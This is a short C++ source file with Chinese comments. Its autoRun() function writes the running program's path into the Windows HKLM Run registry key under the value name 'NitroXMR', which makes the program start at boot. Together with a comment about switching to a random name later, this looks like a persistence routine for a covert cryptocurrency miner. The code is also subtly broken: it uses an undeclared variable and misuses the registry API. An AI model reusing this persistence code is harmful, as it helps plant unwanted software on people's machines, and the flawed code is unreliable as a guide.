#include "stdafx.h"
#include "autoRun.h"

// executePath


LIBAUX_API BOOL autoRun()
{
	CString exePath;
	CRegKey reg;        //定义注册表对象

	//HKEY hK;
	//RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	//	0, KEY_WRITE | KEY_READ, &hK);
	//printf("%d\n", hK);
	//RegCloseKey(hK);

	//这里竟然自动到了Software\\WOW6432node\\Microsoft\\Windows\\CurrentVersion\\Run
	//折腾了半天就是说怎么打得开写的入就是没有!!!!!!F**K
	//都上atl了,不过也挺好用

	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{
		
		HKEY hKey = reg.m_hKey;

		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
		{
			printf("%d\n", reg.m_hKey);

			//应该传入随机名称这里先代替掉
			GetModuleFileName(NULL, executePath, MAX_PATH);

			reg.SetStringValue(L"NitroXMR", executePath);
			
			MessageBox(NULL, L"key in", L"info", NULL);
		
		}
			reg.Close();
	}

	return TRUE;
}